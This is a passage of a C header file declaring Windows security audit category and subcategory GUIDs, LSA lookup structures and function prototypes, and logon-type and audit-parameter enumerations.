    #define Audit_Logon_AccountLockout_defined
    #endif
#endif

/* 0cce9218-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecMainMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecMainMode,
        0x0cce9218,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecMainMode_defined
    #endif
#endif

/* 0cce9219-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecQuickMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecQuickMode,
        0x0cce9219,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecQuickMode_defined
    #endif
#endif

/* 0cce921a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_IPSecUserMode_defined)
    DEFINE_GUID(
        Audit_Logon_IPSecUserMode,
        0x0cce921a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_IPSecUserMode_defined
    #endif
#endif

/* 0cce921b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_SpecialLogon_defined)
    DEFINE_GUID(
        Audit_Logon_SpecialLogon,
        0x0cce921b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_SpecialLogon_defined
    #endif
#endif

/* 0cce921c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Others_defined)
    DEFINE_GUID(
        Audit_Logon_Others,
        0x0cce921c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Others_defined
    #endif
#endif

/* 0cce921d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FileSystem_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FileSystem,
        0x0cce921d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FileSystem_defined
    #endif
#endif

/* 0cce921e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Registry_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Registry,
        0x0cce921e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Registry_defined
    #endif
#endif

/* 0cce921f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Kernel_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Kernel,
        0x0cce921f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Kernel_defined
    #endif
#endif

/* 0cce9220-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Sam_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Sam,
        0x0cce9220,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Sam_defined
    #endif
#endif

/* 0cce9221-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_CertificationServices_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_CertificationServices,
        0x0cce9221,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_CertificationServices_defined
    #endif
#endif

/* 0cce9222-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_ApplicationGenerated_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_ApplicationGenerated,
        0x0cce9222,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_ApplicationGenerated_defined
    #endif
#endif

/*
The Audit_ObjectAccess_Handle sub-category behaves different from the other sub-categories.
For handle based audits to be generated (Open handle AuditId: 0x1230, Close handle AuditId:
0x1232), the corresponding object sub-category AND Audit_ObjectAccess_Handle must be
enabled. For eg, to generate handle based audits for Reg keys, both
Audit_ObjectAccess_Registry and Audit_ObjectAccess_Handle must be enabled
*/

/* 0cce9223-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Handle_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Handle,
        0x0cce9223,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Handle_defined
    #endif
#endif

/* 0cce9224-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Share_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Share,
        0x0cce9224,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Share_defined
    #endif
#endif

/* 0cce9225-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FirewallPacketDrops_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FirewallPacketDrops,
        0x0cce9225,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FirewallPacketDrops_defined
    #endif
#endif

/* 0cce9226-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_FirewallConnection_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_FirewallConnection,
        0x0cce9226,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_FirewallConnection_defined
    #endif
#endif

/* 0cce9227-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_Other_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_Other,
        0x0cce9227,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_Other_defined
    #endif
#endif

/* 0cce9228-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_Sensitive_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_Sensitive,
        0x0cce9228,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_Sensitive_defined
    #endif
#endif

/* 0cce9229-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_NonSensitive_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_NonSensitive,
        0x0cce9229,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_NonSensitive_defined
    #endif
#endif

/* 0cce922a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_Others_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse_Others,
        0x0cce922a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_Others_defined
    #endif
#endif

/* 0cce922b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_ProcessCreation_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_ProcessCreation,
        0x0cce922b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_ProcessCreation_defined
    #endif
#endif

/* 0cce922c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_ProcessTermination_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_ProcessTermination,
        0x0cce922c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_ProcessTermination_defined
    #endif
#endif

/* 0cce922d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_DpapiActivity_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_DpapiActivity,
        0x0cce922d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_DpapiActivity_defined
    #endif
#endif

/* 0cce922e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_RpcCall_defined)
    DEFINE_GUID(
        Audit_DetailedTracking_RpcCall,
        0x0cce922e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_RpcCall_defined
    #endif
#endif

/* 0cce922f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuditPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuditPolicy,
        0x0cce922f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuditPolicy_defined
    #endif
#endif

/* 0cce9230-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuthenticationPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuthenticationPolicy,
        0x0cce9230,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuthenticationPolicy_defined
    #endif
#endif

/* 0cce9231-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_AuthorizationPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_AuthorizationPolicy,
        0x0cce9231,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_AuthorizationPolicy_defined
    #endif
#endif

/* 0cce9232-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_MpsscvRulePolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_MpsscvRulePolicy,
        0x0cce9232,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_MpsscvRulePolicy_defined
    #endif
#endif

/* 0cce9233-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_WfpIPSecPolicy_defined)
    DEFINE_GUID(
        Audit_PolicyChange_WfpIPSecPolicy,
        0x0cce9233,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_WfpIPSecPolicy_defined
    #endif
#endif

/* 0cce9234-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_Others_defined)
    DEFINE_GUID(
        Audit_PolicyChange_Others,
        0x0cce9234,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_Others_defined
    #endif
#endif

/* 0cce9235-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_UserAccount_defined)
    DEFINE_GUID(
        Audit_AccountManagement_UserAccount,
        0x0cce9235,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_UserAccount_defined
    #endif
#endif

/* 0cce9236-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_ComputerAccount_defined)
    DEFINE_GUID(
        Audit_AccountManagement_ComputerAccount,
        0x0cce9236,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_ComputerAccount_defined
    #endif
#endif

/* 0cce9237-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_SecurityGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_SecurityGroup,
        0x0cce9237,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_SecurityGroup_defined
    #endif
#endif

/* 0cce9238-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_DistributionGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_DistributionGroup,
        0x0cce9238,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_DistributionGroup_defined
    #endif
#endif

/* 0cce9239-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_ApplicationGroup_defined)
    DEFINE_GUID(
        Audit_AccountManagement_ApplicationGroup,
        0x0cce9239,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_ApplicationGroup_defined
    #endif
#endif

/* 0cce923a-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_Others_defined)
    DEFINE_GUID(
        Audit_AccountManagement_Others,
        0x0cce923a,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_Others_defined
    #endif
#endif

/* 0cce923b-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DSAccess_DSAccess_defined)
    DEFINE_GUID(
        Audit_DSAccess_DSAccess,
        0x0cce923b,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DSAccess_DSAccess_defined
    #endif
#endif

/* 0cce923c-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DsAccess_AdAuditChanges_defined)
    DEFINE_GUID(
        Audit_DsAccess_AdAuditChanges,
        0x0cce923c,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DsAccess_AdAuditChanges_defined
    #endif
#endif

/* 0cce923d-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Ds_Replication_defined)
    DEFINE_GUID(
        Audit_Ds_Replication,
        0x0cce923d,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Ds_Replication_defined
    #endif
#endif

/* 0cce923e-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Ds_DetailedReplication_defined)
    DEFINE_GUID(
        Audit_Ds_DetailedReplication,
        0x0cce923e,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Ds_DetailedReplication_defined
    #endif
#endif

/* 0cce923f-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_CredentialValidation_defined)
    DEFINE_GUID(
        Audit_AccountLogon_CredentialValidation,
        0x0cce923f,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_CredentialValidation_defined
    #endif
#endif

/* 0cce9240-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_Kerberos_defined)
    DEFINE_GUID(
        Audit_AccountLogon_Kerberos,
        0x0cce9240,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_Kerberos_defined
    #endif
#endif

/* 0cce9241-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_Others_defined)
    DEFINE_GUID(
        Audit_AccountLogon_Others,
        0x0cce9241,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_Others_defined
    #endif
#endif

/* 0cce9242-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_KerbCredentialValidation_defined)
    DEFINE_GUID(
        Audit_AccountLogon_KerbCredentialValidation,
        0x0cce9242,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_KerbCredentialValidation_defined
    #endif
#endif

/* 0cce9243-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_NPS_defined)
    DEFINE_GUID(
        Audit_Logon_NPS,
        0x0cce9243,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_NPS_defined
    #endif
#endif

/* 0cce9244-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_DetailedFileShare_defined)
    DEFINE_GUID(
        Audit_ObjectAccess_DetailedFileShare,
        0x0cce9244,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_DetailedFileShare_defined
    #endif
#endif

#endif // DEFINE_GUID


//
// All categories are named as <Audit_CategoryName>
//

#ifdef DEFINE_GUID

/* 69979848-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_defined)
    DEFINE_GUID(
        Audit_System,
        0x69979848,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_defined
    #endif
#endif

/* 69979849-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_defined)
    DEFINE_GUID(
        Audit_Logon,
        0x69979849,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_defined
    #endif
#endif

/* 6997984a-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_ObjectAccess_defined)
    DEFINE_GUID(
        Audit_ObjectAccess,
        0x6997984a,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_ObjectAccess_defined
    #endif
#endif

/* 6997984b-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PrivilegeUse_defined)
    DEFINE_GUID(
        Audit_PrivilegeUse,
        0x6997984b,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PrivilegeUse_defined
    #endif
#endif

/* 6997984c-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DetailedTracking_defined)
    DEFINE_GUID(
        Audit_DetailedTracking,
        0x6997984c,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DetailedTracking_defined
    #endif
#endif

/* 6997984d-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_PolicyChange_defined)
    DEFINE_GUID(
        Audit_PolicyChange,
        0x6997984d,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_PolicyChange_defined
    #endif
#endif

/* 6997984e-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountManagement_defined)
    DEFINE_GUID(
        Audit_AccountManagement,
        0x6997984e,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountManagement_defined
    #endif
#endif

/* 6997984f-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_DirectoryServiceAccess_defined)
    DEFINE_GUID(
        Audit_DirectoryServiceAccess,
        0x6997984f,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_DirectoryServiceAccess_defined
    #endif
#endif

/* 69979850-797a-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_AccountLogon_defined)
    DEFINE_GUID(
        Audit_AccountLogon,
        0x69979850,
        0x797a, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_AccountLogon_defined
    #endif
#endif

#endif // DEFINE_GUID

// 04.06.2011 - added
#if !defined(_NTLSA_IFS_)
#define _NTLSA_IFS_

#if !defined(_LSALOOKUP_)
#define _LSALOOKUP_

#if defined(_NTDEF_)

typedef UNICODE_STRING LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
typedef STRING LSA_STRING, *PLSA_STRING;
typedef OBJECT_ATTRIBUTES LSA_OBJECT_ATTRIBUTES, *PLSA_OBJECT_ATTRIBUTES;

#else // _NTDEF_

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength/2), length_is(Length/2)]
#endif // MIDL_PASS
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef struct _LSA_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} LSA_STRING, *PLSA_STRING;

typedef struct _LSA_OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PLSA_UNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} LSA_OBJECT_ATTRIBUTES, *PLSA_OBJECT_ATTRIBUTES;

#endif // _NTDEF_

typedef struct _LSA_TRUST_INFORMATION {
	LSA_UNICODE_STRING Name;	// The name of the domain
	PSID Sid;									// ptr to domain Sid
} LSA_TRUST_INFORMATION, *PLSA_TRUST_INFORMATION;

typedef struct _LSA_REFERENCED_DOMAIN_LIST {
	ULONG Entries;									// count of domains in domain array
	PLSA_TRUST_INFORMATION Domains;	// pointer to array LSA_TRUST_INFORMATION data
} LSA_REFERENCED_DOMAIN_LIST, *PLSA_REFERENCED_DOMAIN_LIST;

#if (_WIN32_WINNT >= 0x0501)
typedef struct _LSA_TRANSLATED_SID2 {
	SID_NAME_USE Use;
	PSID         Sid;
	LONG         DomainIndex;
	ULONG        Flags;
} LSA_TRANSLATED_SID2, *PLSA_TRANSLATED_SID2;
#endif

typedef struct _LSA_TRANSLATED_NAME {
	SID_NAME_USE Use;
	LSA_UNICODE_STRING Name;
	LONG DomainIndex;
} LSA_TRANSLATED_NAME, *PLSA_TRANSLATED_NAME;

typedef struct _POLICY_ACCOUNT_DOMAIN_INFO {
	LSA_UNICODE_STRING DomainName;
	PSID DomainSid;
} POLICY_ACCOUNT_DOMAIN_INFO, *PPOLICY_ACCOUNT_DOMAIN_INFO;

typedef struct _POLICY_DNS_DOMAIN_INFO
{
	LSA_UNICODE_STRING Name;
	LSA_UNICODE_STRING DnsDomainName;
	LSA_UNICODE_STRING DnsForestName;
	GUID DomainGuid;
	PSID Sid;
} POLICY_DNS_DOMAIN_INFO, *PPOLICY_DNS_DOMAIN_INFO;

#define LOOKUP_VIEW_LOCAL_INFORMATION       0x00000001
#define LOOKUP_TRANSLATE_NAMES              0x00000800

typedef enum _LSA_LOOKUP_DOMAIN_INFO_CLASS {
	AccountDomainInformation = 5,
	DnsDomainInformation     = 12
} LSA_LOOKUP_DOMAIN_INFO_CLASS, *PLSA_LOOKUP_DOMAIN_INFO_CLASS;

typedef PVOID LSA_LOOKUP_HANDLE, *PLSA_LOOKUP_HANDLE;

NTSTATUS
LsaLookupOpenLocalPolicy(
	IN PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
	IN ACCESS_MASK AccessMask,
	IN OUT PLSA_LOOKUP_HANDLE PolicyHandle
	);

NTSTATUS
LsaLookupClose(
	IN LSA_LOOKUP_HANDLE ObjectHandle
	);

NTSTATUS
LsaLookupTranslateSids(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PSID *Sids,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_NAME *Names
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
LsaLookupTranslateNames(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN ULONG Flags,
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID2 *Sids
	);
#endif

NTSTATUS
LsaLookupGetDomainInfo(
	IN LSA_LOOKUP_HANDLE PolicyHandle,
	IN LSA_LOOKUP_DOMAIN_INFO_CLASS DomainInfoClass,
	OUT PVOID *DomainInfo
	);

NTSTATUS
LsaLookupFreeMemory(
	IN PVOID Buffer
	);

#endif // _LSALOOKUP_

#define LSA_MODE_PASSWORD_PROTECTED     (0x00000001L)
#define LSA_MODE_INDIVIDUAL_ACCOUNTS    (0x00000002L)
#define LSA_MODE_MANDATORY_ACCESS       (0x00000004L)
#define LSA_MODE_LOG_FULL               (0x00000008L)

typedef enum _SECURITY_LOGON_TYPE {
    UndefinedLogonType = 0, // This is used to specify an undefied logon type
    Interactive = 2,      // Interactively logged on (locally or remotely)
    Network,              // Accessing system via network
    Batch,                // Started via a batch queue
    Service,              // Service started by service controller
    Proxy,                // Proxy logon
    Unlock,               // Unlock workstation
    NetworkCleartext,     // Network logon with cleartext credentials
    NewCredentials,       // Clone caller, new default credentials
    //The types below only exist in Windows XP and greater
#if (_WIN32_WINNT >= 0x0501)
    RemoteInteractive,  // Remote, yet interactive. Terminal server
    CachedInteractive,  // Try cached credentials without hitting the net.
    // The types below only exist in Windows Server 2003 and greater
#endif
#if (_WIN32_WINNT >= 0x0502)
    CachedRemoteInteractive, // Same as RemoteInteractive, this is used internally for auditing purpose
    CachedUnlock        // Cached Unlock workstation
#endif
} SECURITY_LOGON_TYPE, *PSECURITY_LOGON_TYPE;

typedef ULONG LSA_OPERATIONAL_MODE, *PLSA_OPERATIONAL_MODE;

#if !defined(_NTLSA_AUDIT_)
#define _NTLSA_AUDIT_

//
// The following enumerated type is used between the reference monitor and
// LSA in the generation of audit messages.  It is used to indicate the
// type of data being passed as a parameter from the reference monitor
// to LSA.  LSA is responsible for transforming the specified data type
// into a set of unicode strings that are added to the event record in
// the audit log.
//

typedef enum _SE_ADT_PARAMETER_TYPE {

    SeAdtParmTypeNone = 0,          //Produces 1 parameter
    SeAdtParmTypeString,            //Produces 1 parameter.
    SeAdtParmTypeFileSpec,
		SeAdtParmTypeUlong,             //Produces 1 parameter
    SeAdtParmTypeSid,               //Produces 1 parameter.
    SeAdtParmTypeLogonId,           //Produces 4 parameters.
    SeAdtParmTypeNoLogonId,         //Produces 3 parameters.
    SeAdtParmTypeAccessMask,        //Produces 1 parameter with formatting.
    SeAdtParmTypePrivs,             //Produces 1 parameter with formatting.
    SeAdtParmTypeObjectTypes,       //Produces 10 parameters with formatting.
    SeAdtParmTypeHexUlong,          //Produces 1 parameter
